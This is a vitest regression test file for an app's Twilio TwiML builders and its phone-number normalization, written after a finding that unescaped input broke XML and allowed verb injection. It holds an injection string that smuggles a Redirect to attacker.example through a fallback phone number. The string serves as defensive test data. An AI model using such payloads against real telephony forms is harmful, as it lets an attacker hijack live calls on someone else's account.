import { beforeEach, describe, expect, it, vi } from 'vitest';
import { twimlDial, twimlGather, twimlRecord, twimlSay, wrapTwiml } from '@/lib/guardian/twilio';
import { toCallableE164 } from '@/lib/contact-center/phone';

/**
 * Every TwiML builder interpolated its values into XML, and only the spoken
 * text was escaped. Two things followed.
 *
 * The Guardian screening prompt put `?sessionId=…&turn=2` into a Gather
 * attribute. A bare `&` is not well-formed XML, and Twilio parses TwiML
 * strictly, so a call that reached AI screening got a parse failure instead of
 * the question.
 *
 * The Contact Center's fallback number was saved exactly as a parent typed it
 * and dialled as `<Dial>${number}</Dial>`. Text that closes the element adds
 * verbs of its own — a <Redirect> hands the live call, on Bubaly's Twilio
 * account, to a document anywhere. And the field's own placeholder format,
 * "+1 555 123 4567", failed urgent SMS delivery's E.164 check on every message.
 */

// A strict well-formedness check for the shape these builders produce: every
// `&` begins an entity, attribute values are quoted and hold no `<` or `"`,
// text holds no `<`, and elements nest.
function assertWellFormed(doc: string) {
  const body = doc.replace(/^<\?xml[^?]*\?>/, '');
  expect(body.match(/&(?!(?:amp|lt|gt|quot|apos);)/g), `stray & in ${body}`).toBeNull();
  const stack: string[] = [];
  const tag = /<(\/?)([A-Za-z]+)((?:\s+[A-Za-z]+="[^"<]*")*)\s*(\/?)>/y;
  let i = 0;
  while (i < body.length) {
    const lt = body.indexOf('<', i);
    if (lt < 0) break;
    tag.lastIndex = lt;
    const m = tag.exec(body);
    expect(m, `malformed tag at ${body.slice(lt, lt + 60)}`).not.toBeNull();
    const [, closing, name, , selfClosing] = m!;
    if (closing) expect(stack.pop(), `</${name}> closes nothing open`).toBe(name);
    else if (!selfClosing) stack.push(name);
    i = tag.lastIndex;
  }
  expect(stack, 'unclosed elements').toEqual([]);
}

const verbs = (doc: string) => [...doc.matchAll(/<([A-Z][A-Za-z]*)/g)].map((m) => m[1]);

const INJECTION = '+15551234567</Dial><Redirect>https://attacker.example/twiml</Redirect><Dial>+15557654321';

describe('TwiML is a document Twilio can parse', () => {
  it('keeps a query string with & in a Gather action well-formed', () => {
    const doc = wrapTwiml(twimlGather({ action: 'https://bubaly.test/api/guardian/screen?sessionId=s-1&turn=2', text: 'Who is calling?' }));
    assertWellFormed(doc);
    expect(doc).toContain('sessionId=s-1&amp;turn=2');
  });

  it('keeps Record callbacks and spoken text well-formed', () => {
    const doc = wrapTwiml(
      twimlSay('Tom & Jerry said "hi" <loudly>'),
      twimlRecord({ action: 'https://b.test/v?a=1&b=2', transcribeCallback: 'https://b.test/t?x=1&y=2', text: 'After the tone & then hang up' }),
    );
    assertWellFormed(doc);
  });

  it('cannot be given verbs through a number', () => {
    const doc = wrapTwiml(twimlDial(INJECTION, '+15550001111"><Redirect>x</Redirect><Dial callerId="'));
    assertWellFormed(doc);
    expect(verbs(doc)).toEqual(['Response', 'Dial']);
  });
});

describe('a number Bubaly will dial', () => {
  it('normalizes what the form suggests typing', () => {
    expect(toCallableE164('+1 555 123 4567')).toBe('+15551234567');
    expect(toCallableE164('(555) 123-4567')).toBe('+15551234567');
    expect(toCallableE164('+44 20 7946 0958')).toBe('+442079460958');
  });

  it('does not make a number out of text', () => {
    expect(toCallableE164(INJECTION)).toBeNull();
    expect(toCallableE164('call 555 123 4567 after 6')).toBeNull();
    expect(toCallableE164('')).toBeNull();
    expect(toCallableE164(null)).toBeNull();
  });
});

const state = vi.hoisted(() => ({ patches: [] as Array<Record<string, unknown>> }));

vi.mock('next/cache', () => ({ revalidatePath: vi.fn() }));
vi.mock('@/lib/supabase/auth', () => ({
  requireUserContext: async () => ({ user: { id: 'u-1' }, active: { familyId: 'f-1', role: 'parent' } }),
}));
vi.mock('@/lib/server/plan', () => ({ resolveFamilyPlanLevel: async () => 2 }));
vi.mock('@/lib/contact-center/server', () => ({
  getOrCreateChannelResult: async () => ({ data: { family_id: 'f-1' }, error: null }),
  provisionFamilyNumber: vi.fn(),
}));
vi.mock('@/lib/supabase/server', () => ({
  createServer: async () => ({}),
  createServiceClient: () => ({
    from: () => ({
      update: (patch: Record<string, unknown>) => {
        state.patches.push(patch);
        return { eq: async () => ({ error: null }) };
      },
    }),
  }),
}));

async function save(forwardTo: string | null) {
  const { updateConciergeAction } = await import('@/app/(app)/dashboard/contact-center/actions');
  return updateConciergeAction({ forwardTo });
}

describe('saving the concierge fallback number', () => {
  beforeEach(() => { vi.resetModules(); state.patches = []; });

  it('stores the number as E.164', async () => {
    expect(await save('+1 555 123 4567')).toEqual({ ok: true });
    expect(state.patches).toEqual([{ forward_to_phone: '+15551234567' }]);
  });

  it('clears it when emptied', async () => {
    expect(await save(null)).toEqual({ ok: true });
    expect(await save('   ')).toEqual({ ok: true });
    expect(state.patches).toEqual([{ forward_to_phone: null }, { forward_to_phone: null }]);
  });

  // The finding.
  it('refuses text that is not a number, and writes nothing', async () => {
    const res = await save(INJECTION);
    expect(res.ok, 'an injected fallback number was saved').toBe(false);
    expect(state.patches).toEqual([]);
  });
});
